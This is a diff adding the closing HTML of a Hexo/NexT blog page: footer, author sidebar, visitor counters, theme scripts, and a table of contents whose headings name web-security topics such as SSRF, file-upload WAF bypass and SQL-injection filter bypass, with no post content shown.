+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#敏感目录-文件访问专题"><span class="nav-number">1.</span> <span class="nav-text">敏感目录/文件访问专题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF专题"><span class="nav-number">2.</span> <span class="nav-text">SSRF专题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含专题"><span class="nav-number">3.</span> <span class="nav-text">文件包含专题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j2专题"><span class="nav-number">4.</span> <span class="nav-text">log4j2专题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传专题"><span class="nav-number">5.</span> <span class="nav-text">文件上传专题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#针对后缀黑名单的绕过"><span class="nav-number">5.1.</span> <span class="nav-text">针对后缀黑名单的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#别名代替"><span class="nav-number">5.1.1.</span> <span class="nav-text">别名代替</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">5.1.2.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux"><span class="nav-number">5.1.3.</span> <span class="nav-text">linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#针对waf的绕过"><span class="nav-number">5.2.</span> <span class="nav-text">针对waf的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#后缀落地"><span class="nav-number">5.2.1.</span> <span class="nav-text">后缀落地</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell访问"><span class="nav-number">5.2.2.</span> <span class="nav-text">shell访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内容绕过"><span class="nav-number">5.2.3.</span> <span class="nav-text">内容绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对字段动手干扰WAF"><span class="nav-number">5.3.</span> <span class="nav-text">对字段动手干扰WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Content-Tye"><span class="nav-number">5.3.1.</span> <span class="nav-text">Content-Tye</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Content-Disposition"><span class="nav-number">5.3.2.</span> <span class="nav-text">Content-Disposition</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#增加Expect-100-continue-header头"><span class="nav-number">5.3.3.</span> <span class="nav-text">增加Expect: 100-continue header头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">5.4.</span> <span class="nav-text">参考文章</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nginx场景绕过"><span class="nav-number">6.</span> <span class="nav-text">nginx场景绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章-1"><span class="nav-number">6.1.</span> <span class="nav-text">参考文章</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入专题"><span class="nav-number">7.</span> <span class="nav-text">SQL注入专题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通用的waf绕过方法"><span class="nav-number">7.1.</span> <span class="nav-text">通用的waf绕过方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#等价代替"><span class="nav-number">7.2.</span> <span class="nav-text">等价代替</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格过滤"><span class="nav-number">7.2.1.</span> <span class="nav-text">空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#if过滤"><span class="nav-number">7.2.2.</span> <span class="nav-text">if过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mid过滤"><span class="nav-number">7.2.3.</span> <span class="nav-text">mid过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逗号过滤"><span class="nav-number">7.2.4.</span> <span class="nav-text">逗号过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#等号过滤"><span class="nav-number">7.2.5.</span> <span class="nav-text">等号过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ascii过滤"><span class="nav-number">7.2.6.</span> <span class="nav-text">ascii过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#大于小于号过滤"><span class="nav-number">7.2.7.</span> <span class="nav-text">大于小于号过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章-2"><span class="nav-number">7.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">202k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
